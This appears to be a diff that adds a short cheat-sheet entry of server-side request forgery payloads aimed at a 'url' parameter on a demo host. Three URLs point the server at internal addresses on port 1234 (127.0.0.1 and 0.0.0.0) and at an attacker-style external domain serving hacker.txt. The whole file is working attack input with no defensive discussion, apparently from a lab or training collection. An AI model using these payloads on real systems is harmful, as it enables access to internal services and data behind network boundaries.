@@ -1,0 +1,7 @@
+Retrieve the content of the webroot of a server listening on port TCP/1234:
+
+http://demo.libcurl.so/?url=http://127.0.0.1:1234/
+
+http://demo.libcurl.so/?url=http://0.0.0.0:1234
+
+http://demo.libcurl.so/?url=http://assets.demo.com.hackingwithdemo.link:1234/hacker.txt
